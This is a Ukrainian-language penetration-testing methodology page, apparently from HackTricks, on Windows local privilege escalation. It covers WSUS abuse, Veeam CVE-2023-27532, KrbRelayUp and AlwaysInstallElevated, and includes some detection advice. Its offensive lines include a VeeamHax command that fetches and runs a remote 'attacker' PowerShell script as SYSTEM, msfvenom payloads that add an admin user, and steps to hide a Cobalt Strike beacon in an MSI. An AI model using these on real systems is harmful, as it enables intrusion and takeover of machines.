# Підвищення локальних привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний процес переліку також ґрунтується на семінарах і контрольних списках спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичні матеріали про атаки включають презентацію DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Маркери доступу

**Якщо ви не знаєте, що таке маркери доступу Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs — DACLs/SACLs/ACEs

**Докладніше про ACLs — DACLs/SACLs/ACEs читайте на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні механізми, які можуть **перешкодити вам збирати дані про систему**, запускати виконувані файли або навіть **виявити вашу діяльність**. Перш ніж починати збір даних для підвищення привілеїв, **прочитайте** цю **сторінку** та **перевірте** всі ці **механізми** **захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити редагування UEFI NVRAM в автономному режимі на ланцюжок атак із DMA до завантаження ОС і зміною пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / безшумне підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки secure-path в AppInfo. Описаний тут спеціальний процес обходу UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису в реєстрі SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У нових збірках Windows також з’явився шлях LPE через **SMB arbitrary-port**, за якого привілейована локальна NTLM-автентифікація відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перелік відомостей про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) стане в пригоді для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas містить вбудований watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та можливі відповідні рекомендації; перш ніж вважати результат застосовним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального exploit, специфічного для певної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай вказує на 32-бітний системний каталог, тоді як `%windir%\Sysnative` дає цьому процесу доступ до нативного системного каталогу. 64-бітному процесу цей псевдонім недоступний. Збірка ОС або ймовірна відсутність KB не доводить можливість експлуатації; звірте запущену збірку, встановлене оновлення або оновлення, що його замінює, архітектуру процесу та передумови exploit із [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) для конкретної проблеми.

**Локально, використовуючи системну інформацію**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії GitHub з exploit-кодом:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено в змінних середовища облікові дані або будь-яку цінну інформацію?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскрипції PowerShell

Дізнатися, як увімкнути цю функцію, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях виводу та ACL файлу: він може містити аргументи команд і їхній вивід, зокрема облікові дані. Доступний для читання транскрипт є лише зачіпкою, якщо його вміст розкриває придатну для використання особу з вищими привілеями, а ця особа може ввійти в систему у відповідному контексті.

### PowerShell Module Logging

Записуються подробиці виконання конвеєра PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні подробиці виконання та результати виводу можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся вказівок у розділі документації «Transcript files», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний журнал активності та вмісту виконання скрипту, що забезпечує документування кожного блоку коду під час його виконання. Це дає змогу зберегти повний аудиторський слід усіх дій, корисний для криміналістичного аналізу та дослідження шкідливої поведінки. Документування всіх дій під час виконання надає детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Журнали подій для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна скористатися:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Параметри Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

У попередніх рекомендаціях ризик підсумовано так:

Ви можете скомпрометувати систему, якщо оновлення запитуються через http, а не через http**S**.

Кінцева точка WSUS через HTTP — це підстава перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики довіри до оновлень і їх інсталяції на клієнті. Самої лише URL-адреси недостатньо, щоб стверджувати про можливість виконання коду. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Для початку перевірте, чи використовує мережа WSUS-оновлення без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або наступне в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримаєте відповідь, схожу на одну з таких:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Початкове твердження про застосовність було таким:

Тоді **це можна експлуатувати.** Якщо останній параметр реєстру дорівнює `0`, запис WSUS буде проігноровано.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану інтрамережеву службу. Це підтверджує наявність передумови для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення чи його встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, цей конкретний кінцевий вузол WSUS, налаштований цією політикою, не вибирається.

Щоб експлуатувати ці вразливості, можна скористатися такими інструментами, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це озброєні MiTM-експлойти-скрипти для впровадження «фальшивих» оновлень у незашифрований SSL-трафік WSUS.

Дослідження тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Прочитайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка експлуатує таку вразливість:

> Якщо ми можемо змінювати проксі-сервер для локального користувача, а Windows Updates використовує проксі, налаштований у параметрах Internet Explorer, ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний трафік і виконати код від імені користувача з підвищеними привілеями на нашому пристрої.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми створимо самопідписаний сертифікат для імені вузла WSUS і додамо його до сховища сертифікатів поточного користувача, то зможемо перехоплювати трафік WSUS як через HTTP, так і через HTTPS. У WSUS немає механізмів на зразок HSTS для перевірки сертифіката за принципом «довіряти під час першого використання». Якщо користувач довіряє наданому сертифікату, а його ім’я вузла правильне, служба прийме цей сертифікат.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли його опублікують).

### Оновлення, контрольовані адміністратором WSUS

Окремий шлях існує, якщо поточна ідентичність може **публікувати й схвалювати** оновлення на сервері WSUS. Перевірте ефективне членство в групі `WSUS Administrators` сервера та наявність делегованих дозволів WSUS, а потім визначте групу комп’ютерів-клієнтів, яка отримає схвалене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для схвалення оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує довірчі відносини для публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що кандидатне оновлення підписане й приймається, застосовне до цілі та встановлюється в контексті з вищими привілеями. Саме лише значення HTTP `WUServer` або назва групи не підтверджують виконання цих умов.

### Зловживання спеціальними оновленнями SUSDB: непідписані корисні навантаження через `.txt`/`.esd`

Це порушення межі довіри, відмінне від перехоплення HTTP-з’єднання WSUS: передумовою є достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, щоб опублікувати й схвалити спеціальне оновлення. Один із практичних способів отримати доступ — перенаправити автентифікацію облікового запису комп’ютера WSUS до окремого сервера MSSQL, на якому розміщено `SUSDB`; точні передумови залежать від розгортання, тому спершу перелічіть дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Щоб дізнатися про окремий шлях атаки, який перенаправляє автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, див. [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Перевірка перенаправлення до зовнішньої бази даних і прав на процедури

Якщо WSUS використовує зовнішній SQL Server, спершу перевірте, чи може обліковий запис сервера WSUS автентифікуватися в базі даних і чи досягає NTLM relay цього вузла прослуховування. Роль сервера SQL може надавати доступ до процедур публікації оновлень, навіть якщо прямий запис у таблиці заборонено; невдала команда `UPDATE` для `SUSDB` не доводить, що публікацію заблоковано. Перш ніж намагатися опублікувати спеціальне оновлення, перевірте ефективну ідентичність, членство в ролях і дозволи на процедури в авторизованому сеансі SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Визначення процедур у системі та встановлений файл `SoftwareDistributionPackage.xsd` корисні для відтворення коректних метаданих оновлення. Батьківський пакет і дочірній payload мають містити `UpdateIdentity` (тип фрагмента `1`), `LocalizedProperties` (`4`) і `ExtendedProperties` (`2`); зберігайте локальний ідентифікатор ревізії, який повертає кожен виклик `spImportUpdate`, і стежте, щоб зв’язок пакета, дайджести, розмір, URL вмісту та ревізія були узгоджені. Це процес публікації зі збереженням стану, тому один успішний виклик збереженої процедури не доводить виконання на стороні клієнта.<sup>[[38]](#references)</sup>

#### Створення, призначення та затвердження оновлення

Процес роботи з користувацьким оновленням використовує легітимні процедури WSUS як обмежений API публікації. Важливі переходи стану:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження XML-фрагментів передумов, локалізованих і розширених властивостей | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до контрольованого зловмисником URL | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Затвердження встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих/фрагментах. Після призначення URL вмісту та цільової групи остаточне затвердження має такий вигляд; використовуйте нові ідентифікатори оновлення, групи й розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису на основі розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; `CheckCertificateSignature` тоді пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущеним обробником командного рядка інсталяції оновлення. Це помилка змішування типів у політиці, а не підробка підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Підготовка та автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати очікуванням BITS щодо HTTP: доступного URL недостатньо, оскільки передавання використовує початковий цикл `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє помилку синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, потрібний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без участі користувача та persistence повторних спроб

Взаємодія на боці клієнта залежить від політики. Параметр `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, опція `4 - Auto download and schedule install`, дає змогу завантажити й установити схвалене оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, одразу пропонувався знову після завершення процесу callback, тому повторні спроби можуть стати persistence для регулярного виконання; це помітно, оскільки клієнт показує стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на боці сервера й клієнта для цього ланцюжка:<sup>[[39]](#references)</sup>

- Перевіряйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; досліджуйте нові групи націлювання, зовнішні джерела контенту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними принципалами (особливо обліковими записами, що не належать комп’ютерам).
- Переглядайте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте перевірку з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Шукайте випадки, коли встановлення Windows Update повторно завершується невдало/повторюється, а також виконання PE або неочікувану активність дочірніх процесів/мережі з контенту з назвами `.txt` чи `.esd`.
- Якщо це підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте й перевіряйте права `EXECUTE` для процедур користувацьких оновлень.

## Сторонні засоби автоматичного оновлення та IPC агентів (local privesc)

Багато корпоративних агентів надають локальний IPC-інтерфейс і привілейований канал оновлення. Якщо реєстрацію можна спрямувати на сервер зловмисника, а засіб оновлення довіряє підробленому кореневому CA або має слабкі перевірки підписувача, локальний користувач може доставити шкідливий MSI, який установлює служба SYSTEM. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Початковий опис для конкретної версії та примітка щодо розвідки:

Veeam B&R < `11.0.1.1261` надає localhost-службу на **TCP/9401**, яка обробляє контрольовані зловмисником повідомлення, що дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Розвідка**: перевірте наявність listener і версію, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, яка за замовчуванням працює на **TCP/9401**. [Рекомендація Veeam](https://www.veeam.com/kb4424) описує розголошення зашифрованих облікових даних бази конфігурації без автентифікації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тому перевірте її фактичну адресу й PID.

- **Розвідка**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка встановлених виправлень.
- **Мінімальні виправлені версії**: Veeam зазначає **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. Чотирикомпонентна версія файлу сама по собі не дає змоги відрізнити невиправлену базову збірку від пізнішого виправлення на тих самих номерах збірки. Перш ніж вважати граничну збірку виправленою, звірте ідентифікатор виправлення з [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Експлуатація**: розмістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL Veeam в одному каталозі, а потім запустіть payload SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Служба виконує команду від імені SYSTEM.

Цитований PoC демонструє виконання команд від імені SYSTEM, коли виконуються додаткові передумови; рекомендація виробника описує проблему розкриття облікових даних.

## KrbRelayUp

Початковий опис середовища зі стандартними налаштуваннями був таким:

У середовищах Windows із **доменом** за певних умов існує вразливість **local privilege escalation**. До цих умов належать середовища, де **підписування LDAP не обов'язкове**, користувачі мають права на власні облікові записи, які дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD)**, а також можуть створювати комп'ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **стандартних налаштувань**.

Локальний Kerberos relay може забезпечити перехід від входу з нижчими привілеями до привілейованого запису в каталозі, якщо відповідний COM-сервер автентифікується, а ретранслюваний принципал має права на цільовий об'єкт. [Документація KrbRelay](https://github.com/cube0x0/KrbRelay) описує записи LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих шляхів. Ланцюг RBCD потребує відповідних прав делегування та прав на цільовий об'єкт, а ланцюг shadow-credential — прав на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за допомогою сертифіката. Жоден із цих шляхів не випливає лише з членства в домені.

Перевірте політики фактичного контролера домену (DC) щодо [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив'язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об'єкта ретранслюваної ідентичності, а також рівні автентифікації й імперсонації вибраного класу COM. Тип входу й контекст облікових даних виклику мають значення: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. Маршрутизація через firewall/OXID і встановлені оновлення також можуть вплинути на результат. Розглядайте дозвільну політику або відповідний ACL як привід для перевірки; пасивне перерахування не повинно запускати примусову автентифікацію COM, relay-автентифікацію чи записи в каталог. Shadow credential облікового запису комп'ютера може дати змогу отримати квиток комп'ютера, а якщо цей обліковий запис має необхідні права на реплікацію каталогу — і використати окремий шлях DCSync.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, дивіться [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнено** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сеанс meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт записує попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу: можна створити wrapper для файлу "**.bat**", якщо потрібно **лише** виконати **команди**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- За допомогою Cobalt Strike або Metasploit **згенеруйте** новий **Windows EXE TCP payload** у `C:\privesc\beacon.exe`.
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Укажіть назву проєкту, наприклад **AlwaysPrivesc**, задайте розташування **`C:\privesc`**, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виберіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб встановлена програма виглядала легітимнішою.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що платформу встановлено на x64.

### MSI Installation

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі**:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Налаштування аудиту

Ці налаштування визначають, що саме **журналюється**, тож на них варто звернути увагу

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

